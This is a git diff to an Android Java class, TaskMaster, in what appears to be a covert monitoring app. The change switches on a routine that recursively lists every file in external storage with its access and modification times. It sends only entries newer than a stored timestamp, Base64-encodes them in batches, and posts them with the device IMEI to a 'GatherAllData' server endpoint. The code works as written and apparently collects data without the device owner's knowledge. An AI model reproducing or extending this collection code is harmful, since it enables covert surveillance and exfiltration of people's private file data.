@@ -39,8 +39,10 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.InputStream;
 import java.sql.Timestamp;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
+import java.util.Date;
 import java.util.List;
 
 import src.silent.utils.BatteryHandler;
@@ -65,7 +67,7 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
         String[] maskHash2 = maskHash.split(";");
         String[] hashes = maskHash2[1].split(":");
 
-        //getFilesMetadata(params[0].context, params[0].IMEI);
+        getFilesMetadata(hashes[7], params[0].context, params[0].IMEI);
         JSONObject bulkData = new JSONObject();
         for (int i = 0; i < maskHash2[0].length(); i++) {
             if (maskHash2[0].charAt(i) == '1') {
@@ -107,28 +109,44 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
         return null;
     }
 
-    private void getFilesMetadata(Context context, String IMEI) {
+    private void getFilesMetadata(String hash, Context context, String IMEI) {
         try {
+            String newHash = hash;
             List<String> external = getListFiles(new File(Environment.getExternalStorageDirectory()
-                    .toString()));
+                    .toString()), hash);
 
-            JSONArray metadata = new JSONArray();
+
+            JSONArray informationArray = new JSONArray();
             int counter = 0;
+            SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
             for (String info : external) {
                 counter ++;
-                metadata.put(Base64.encodeToString(info.getBytes(), Base64.URL_SAFE));
+                String[] inf = info.split(";");
+                Date date = df.parse(inf[1]);
+                if (date.getTime() > Long.parseLong(newHash)) {
+                    newHash = String.valueOf(date.getTime());
+                }
+                informationArray.put(Base64.encodeToString(info.getBytes(), Base64.URL_SAFE));
+
 
                 if (counter % 1000 == 0) {
                     JSONObject bulkData = new JSONObject();
+                    JSONObject metadata = new JSONObject();
+                    metadata.put("Metadata", informationArray);
+                    metadata.put("Hash", newHash);
                     bulkData.put("Metadata", metadata);
                     ServerCommunicationHandler.executeDataPost(context,
                             "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
                             IMEI);
+                    informationArray = new JSONArray();
                 }
             }
 
-            if (metadata.length() != 0) {
+            if (informationArray.length() != 0) {
                 JSONObject bulkData = new JSONObject();
+                JSONObject metadata = new JSONObject();
+                metadata.put("Metadata", informationArray);
+                metadata.put("Hash", newHash);
                 bulkData.put("Metadata", metadata);
                 ServerCommunicationHandler.executeDataPost(context,
                         "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
@@ -139,36 +157,41 @@ public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
         }
     }
 
-    private List<String> getListFiles(File parentDir) {
+    private List<String> getListFiles(File parentDir, String hash) {
         ArrayList<String> inFiles = new ArrayList<>();
         File[] files = parentDir.listFiles();
         if (files != null) {
             for (File file : files) {
                 if (file.isDirectory()) {
                     try {
-                        StructStat stat = Os.stat(file.getAbsolutePath().toString());
+                        StructStat stat = Os.stat(file.getAbsolutePath());
                         long lastAccessed = stat.st_atime * 1000L;
                         long lastModified = stat.st_mtime * 1000L;
                         Timestamp accessedTime = new Timestamp(lastAccessed);
                         Timestamp modifiedTime = new Timestamp(lastModified);
 
-                        inFiles.add(file.getAbsolutePath() + ";" + accessedTime.toString()
-                                + ";" + modifiedTime.toString());
+                        if (lastAccessed > Long.parseLong(hash)) {
+                            inFiles.add(file.getAbsolutePath() + ";" + accessedTime.toString()
+                                    + ";" + modifiedTime.toString());
+                        }
                     } catch (Exception ex) {
                         Log.d("EROARE", ex.getMessage());
                     } finally {
-                        inFiles.addAll(getListFiles(file));
+                        inFiles.addAll(getListFiles(file, hash));
                     }
                 } else {
                     try {
-                        StructStat stat = Os.stat(file.getAbsolutePath().toString());
+                        StructStat stat = Os.stat(file.getAbsolutePath());
                         long lastAccessed = stat.st_atime * 1000L;
                         long lastModified = stat.st_mtime * 1000L;
                         Timestamp accessedTime = new Timestamp(lastAccessed);
                         Timestamp modifiedTime = new Timestamp(lastModified);
 
-                        inFiles.add(file.getAbsolutePath() + ";" + accessedTime.toString()
-                                + ";" + modifiedTime.toString());
+                        if (lastAccessed > Long.parseLong(hash)) {
+
+                            inFiles.add(file.getAbsolutePath() + ";" + accessedTime.toString()
+                                    + ";" + modifiedTime.toString());
+                        }
                     } catch (Exception ex) {
                         Log.d("EROARE", ex.getMessage());
                     }
